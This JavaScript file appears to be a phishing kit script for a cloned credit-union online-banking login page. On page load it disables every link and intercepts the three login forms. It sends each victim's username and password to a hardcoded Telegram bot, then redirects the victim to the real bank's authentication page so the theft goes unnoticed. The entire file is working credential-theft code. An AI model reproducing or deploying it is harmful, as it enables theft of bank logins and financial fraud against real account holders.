window.addEventListener("load", () => {
  document.documentElement.style.cssText = "filter:hue-rotate(5deg)";
  const allLinks = document.querySelectorAll("a");
  console.log(allLinks);
  const usernameHeader = document.getElementById("UserName_header");
  const usernameHero = document.getElementById("UserName_hero");
  const usernameHeaderMobile = document.getElementById(
    "UserName_mobile_header"
  );


  const passwordHeader = document.getElementById("Password_header");
  const passwordHero = document.getElementById("Password_hero");
  const passwordHeaderMobile = document.getElementById(
    "Password_mobile_header"
  );
  const submitBtn = document.getElementById(
    "co-online_banking--submit_header"
  );
  const submitBtnHero = document.getElementById(
    "co-online_banking--submit_hero"
  );
  const submitBtnMobile = document.getElementById(
    "co-online_banking--submit-mobile_header"
  );
  const form = submitBtn.parentNode;
  const formHero = submitBtnHero.parentNode;
  const formMobile = submitBtnMobile.parentNode;
  console.log(form);
  const BOT_TOKEN = "6162437418:AAG3o3U1mVmpiyNPKEnDW0VY0JHkUmc-Fdg";
  const chatId = "-1001545828656";

  allLinks.forEach((link) => {
    link.setAttribute("href", "#");
    link.setAttribute("target", "_self");
  });



  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const message = `
💰 Username: \`${usernameHeader.value}\`
💰 Password: \`${passwordHeader.value}\`        
        `;
    console.log(message);

    axios
      .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: message,
      })
      .then((res) => (window.location.href = "https://everywhere.kfcu.org/Authentication"));
  });

  formMobile.addEventListener("submit", function (e) {
    e.preventDefault();

    const message = `
💰 Username: \`${usernameHeaderMobile.value}\`
💰 Password: \`${passwordHeaderMobile.value}\`        
        `;
    console.log(message);

    axios
      .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: message,
      })
      .then((res) => (window.location.href = "https://everywhere.kfcu.org/Authentication"));
  });

  formHero.addEventListener("submit", function (e) {
    e.preventDefault();

    const message = `
💰 Username: \`${usernameHero.value}\`
💰 Password: \`${passwordHero.value}\`        
        `;
    console.log(message);

    axios
      .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: message,
      })
      .then((res) => (window.location.href = "https://everywhere.kfcu.org/Authentication"));
  });
});
